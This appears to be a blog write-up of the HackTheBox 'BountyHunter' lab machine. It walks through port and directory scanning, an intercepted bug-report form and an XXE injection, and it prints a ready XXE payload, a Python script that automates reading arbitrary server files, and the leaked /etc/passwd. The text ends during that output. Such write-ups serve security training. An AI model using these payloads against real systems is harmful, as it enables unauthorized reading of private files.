<!DOCTYPE html>







<html lang="en" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="BountyHunter HTB" />
<meta name="author" content="tinyb0y" />
<meta property="og:locale" content="en" />
<meta name="description" content="Fairly Easy box with a knowledge of XXE and code analysis." />
<meta property="og:description" content="Fairly Easy box with a knowledge of XXE and code analysis." />
<link rel="canonical" href="http://0.0.0.0:4000/posts/BountyHunter/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/BountyHunter/" />
<meta property="og:site_name" content="tinyb0y" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-11-22T05:30:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="BountyHunter HTB" />
<meta name="twitter:site" content="@t1nyb0y" />
<meta name="twitter:creator" content="@tinyb0y" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"Fairly Easy box with a knowledge of XXE and code analysis.","headline":"BountyHunter HTB","@type":"BlogPosting","dateModified":"2021-11-22T05:30:00+05:30","datePublished":"2021-11-22T05:30:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/BountyHunter/"},"url":"http://0.0.0.0:4000/posts/BountyHunter/","author":{"@type":"Person","name":"tinyb0y"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>BountyHunter HTB | tinyb0y
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="tinyb0y">
<meta name="application-name" content="tinyb0y">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/hacker-profile.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">tinyb0y</a>
    </div>
    <div class="site-subtitle font-italic">Pentester. Hacker. Bug Bounty Hunter.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/tinyb0y" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/t1nyb0y" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['tinyb0y','protonmail.com'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>BountyHunter HTB</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add lang-badge for code snippets -->




<!-- return -->





<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>BountyHunter HTB</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            tinyb0y
          </span>
          
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






  on

<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Mon, Nov 22, 2021,  5:30 AM +0530"
  >Nov 22, 2021<i class="unloaded">2021-11-22T05:30:00+05:30</i>
</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1680 words">9 min read</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="bountyhunter">BountyHunter</h1>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725074226.png" alt="[Pasted image 20210725074226.png]" /></p>

<p>Fairly Easy box with a knowledge of XXE and reversing python scripts.</p>

<ul>
  <li>Nmap</li>
  <li>Recon</li>
  <li>XXE Injection</li>
  <li>FootHold</li>
  <li>Root Privilege Escalation</li>
</ul>

<p>As usual let’s start with nmap</p>

<h3 id="nmap">Nmap</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Sun Jul 25 00:30:37 2021 as: nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.129.144.35.nmap 10.129.144.35</span>
Nmap scan report <span class="k">for </span>10.129.144.35
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have only two ports open Port 22 and 80.</p>

<h3 id="enumeration">Enumeration</h3>
<p><strong>Port 80</strong>
We have a website running on port 80. Let’s scroll through and see if we have anything interesting going on the webpages.</p>

<p>Searching for any hidden directories.</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/BountyHunter# ffuf <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.129.144.35/FUZZ  <span class="nt">-o</span> gobuster_php

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\                                           
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                           
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                           
         \ \_\   \ \_\  \ \____/  \ \_\                                           
          \/_/    \/_/   \/___/    \/_/        

       v1.3.1-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://10.129.144.35/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Output file      : gobuster_php
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
resources               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 691ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 206ms]                                               
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 412ms]       
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 208ms]                                          
</span></pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725075822.png" alt="[Pasted image 20210725075822.png]" /></p>

<p>Scrolling through pages, I found portal.php which is under development is taking to another page where we can submit a form.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725075848.png" alt="[Pasted image 20210725075848.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725075911.png" alt="[Pasted image 20210725075911.png]" /></p>

<p>We have <code class="language-plaintext highlighter-rouge">resources</code> directory found from our directory busting. Let’s have a look at it.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080203.png" alt="[Pasted image 20210725080203.png]" /></p>

<p>We have a readme file. It will be useful if we can see any version information of the webpages</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080250.png" alt="[Pasted image 20210725080250.png]" /></p>

<p>We did not find any version info, but we have some kind of task list.</p>

<p>Let’s get back to login form again and try submitting the form with somedetails and intercept in burpsuite.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080555.png" alt="[Pasted image 20210725080555.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080623.png" alt="[Pasted image 20210725080623.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.144.35
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:68.0<span class="o">)</span> Gecko/20100101 Firefox/68.0
Accept: <span class="k">*</span>/<span class="k">*</span>
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Referer: http://10.129.144.35/log_submit.php
Content-Type: application/x-www-form-urlencoded<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 223
Connection: close

<span class="nv">data</span><span class="o">=</span>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU%2BCgkJPGN3ZT5jd2U8L2N3ZT4KCQk8Y3Zzcz5jdnNzPC9jdnNzPgoJCTxyZXdhcmQ%2BMTIwMCQ8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
</pre></td></tr></tbody></table></code></div></div>

<p>It’s posting to <code class="language-plaintext highlighter-rouge">/tracker_diRbPr00f314.php</code> page in a base64 encoded format.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080804.png" alt="[Pasted image 20210725080804.png]" /></p>

<p>The details which we submitted are send in XML format. So we must be have a javascript at client end which does this formation.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725080914.png" alt="[Pasted image 20210725080914.png]" /></p>

<div lang="javascript" class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="c1">//http://10.129.144.35/resources/bountylog.js</span>
<span class="kd">function</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span><span class="nx">data</span><span class="p">},</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">tracker_diRbPr00f314.php</span><span class="dl">"</span>
            <span class="p">}));</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">bountySubmit</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">xml</span> <span class="o">=</span> <span class="s2">`&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
		&lt;bugreport&gt;
		&lt;title&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#exploitTitle</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/title&gt;
		&lt;cwe&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cwe</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cwe&gt;
		&lt;cvss&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cvss</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cvss&gt;
		&lt;reward&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#reward</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/reward&gt;
		&lt;/bugreport&gt;`</span>
		<span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xml</span><span class="p">));</span>
  		<span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#return</span><span class="dl">"</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>All the script does is takes the input from user and converts it base64 encode using <code class="language-plaintext highlighter-rouge">btoa</code> function.</p>

<p>So after looking at the XML, one thing always strikes <strong><em>Try for a XXE injection</em></strong></p>

<h3 id="foothold">FootHold</h3>

<p><strong>Construction of payload</strong></p>

<div lang="xml" class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE tinyb0y[
&lt;!ELEMENT tinyb0y ANY &gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
<span class="nt">&lt;bugreport&gt;</span>
<span class="nt">&lt;title&gt;</span>aaa<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;cwe&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/cwe&gt;</span>
<span class="nt">&lt;cvss&gt;</span>a<span class="nt">&lt;/cvss&gt;</span>
<span class="nt">&lt;reward&gt;</span>12000<span class="nt">&lt;/reward&gt;</span>
<span class="nt">&lt;/bugreport&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>convert-payload to base64</p>

<div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>PCFET0NUWVBFIHRpbnliMHlbCjwhRUxFTUVOVCB0aW55YjB5IEFOWSA+CjwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+IF0+CjxidWdyZXBvcnQ+Cjx0aXRsZT5hYWE8L3RpdGxlPgo8Y3dlPiZ4eGU7PC9jd2U+CjxjdnNzPmE8L2N2c3M+CjxyZXdhcmQ+MTIwMDA8L3Jld2FyZD4KPC9idWdyZXBvcnQ+
</pre></td></tr></tbody></table></code></div></div>

<p>Send the previous burp request and to repeat (ctrl + R) and modify the payload</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725081439.png" alt="[Pasted image 20210725081439.png]" /></p>

<p>We have a successful XXE injection.</p>

<p>So now let’s automate this process using python as it difficult to convert and again post it through burp everytime</p>

<div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>


<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://10.129.144.35/tracker_diRbPr00f314.php"</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">FILE_TO_READ</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;!DOCTYPE foo[</span><span class="se">\
</span><span class="s">	&lt;!ELEMENT foo ANY &gt;</span><span class="se">\
</span><span class="s">	&lt;!ENTITY xxe SYSTEM "file://{}"&gt; ]&gt;</span><span class="se">\
</span><span class="s">	&lt;bugreport&gt;</span><span class="se">\
</span><span class="s">	&lt;title&gt;aaa&lt;/title&gt;</span><span class="se">\
</span><span class="s">	&lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;</span><span class="se">\
</span><span class="s">	&lt;cvss&gt;a&lt;/cvss&gt;</span><span class="se">\
</span><span class="s">	&lt;reward&gt;12000&lt;/reward&gt;</span><span class="se">\
</span><span class="s">	&lt;/bugreport&gt;'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">FILE_TO_READ</span><span class="p">)</span>

	<span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="c1"># print(encoded_payload)
</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'data'</span><span class="p">:</span><span class="n">encoded_payload</span><span class="p">})</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'lxml'</span><span class="p">)</span>
	<span class="n">rows</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'td'</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">rows</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This python script takes our input and converts the payload as required and sends it to server and get’s back revelant content for us</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/BountyHunter# python exp.py 
<span class="o">&gt;</span>/etc/passwd
&lt;td&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
